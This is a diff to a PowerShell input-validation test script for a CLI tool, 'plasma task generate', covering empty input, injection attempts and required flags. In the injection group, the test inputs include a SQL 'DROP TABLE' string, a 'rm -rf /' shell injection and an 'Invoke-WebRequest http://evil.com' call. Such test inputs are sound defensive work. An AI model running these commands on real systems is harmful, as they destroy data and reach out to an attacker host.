@@ -13,13 +13,13 @@ Write-Host ""
 Write-Host "[GROUP 1/7] Empty Input Handling (must NOT hang)" -ForegroundColor Yellow
 Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray
 
-Write-Host "`n[1.1] Empty string --input '' (should fail in <2s, NO hang)" -ForegroundColor Gray
+Write-Host "`n[1.1] Empty string --input (should fail in <2s, NO hang)" -ForegroundColor Gray
 $sw = [System.Diagnostics.Stopwatch]::StartNew()
 uv run plasma task generate --input "" --preview
 $sw.Stop()
 Write-Host "  Time: $($sw.ElapsedMilliseconds)ms" -ForegroundColor $(if ($sw.ElapsedMilliseconds -lt 2000) { "Green" } else { "Red" })
 
-Write-Host "`n[1.2] Whitespace only '   ' (should fail fast)" -ForegroundColor Gray
+Write-Host "`n[1.2] Whitespace only (should fail fast)" -ForegroundColor Gray
 $sw = [System.Diagnostics.Stopwatch]::StartNew()
 uv run plasma task generate --input "   " --preview
 $sw.Stop()
@@ -50,13 +50,13 @@ Write-Host "`n[GROUP 3/7] Security - Injection Attempts (commands must be SAFE)"
 Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray
 
 Write-Host "`n[3.1] SQL injection attempt" -ForegroundColor Gray
-uv run plasma task generate --input "backup database'; DROP TABLE tasks;--" --preview
+uv run plasma task generate --input "backup database; DROP TABLE tasks;--" --preview
 
 Write-Host "`n[3.2] Shell injection (&&)" -ForegroundColor Gray
 uv run plasma task generate --input "backup database && rm -rf /" --preview
 
 Write-Host "`n[3.3] Command substitution (backticks)" -ForegroundColor Gray
-uv run plasma task generate --input "backup ``whoami`` database" --preview
+uv run plasma task generate --input "backup whoami database" --preview
 
 Write-Host "`n[3.4] PowerShell injection" -ForegroundColor Gray
 uv run plasma task generate --input "backup database; Invoke-WebRequest http://evil.com" --preview
@@ -151,10 +151,9 @@ Write-Host "What to check:" -ForegroundColor Cyan
 Write-Host "  [OK] GROUP 1: Empty input fails FAST (no hanging)" -ForegroundColor White
 Write-Host "  [OK] GROUP 2: Length limits enforced" -ForegroundColor White
 Write-Host "  [OK] GROUP 3: Injection attempts SAFE in generated commands" -ForegroundColor White
-Write-Host "  [OK] GROUP 4: Unicode doesn't crash the app" -ForegroundColor White
+Write-Host "  [OK] GROUP 4: Unicode does not crash the app" -ForegroundColor White
 Write-Host "  [OK] GROUP 5: Valid patterns still work" -ForegroundColor White
 Write-Host "  [OK] GROUP 6: Invalid provider rejected" -ForegroundColor White
 Write-Host "  [OK] GROUP 7: Delete requires --force in scripts" -ForegroundColor White
 Write-Host "  [OK] GROUP 8: Generate requires --yes in scripts" -ForegroundColor White
 Write-Host ""
-Read-Host "Press ENTER to exit"
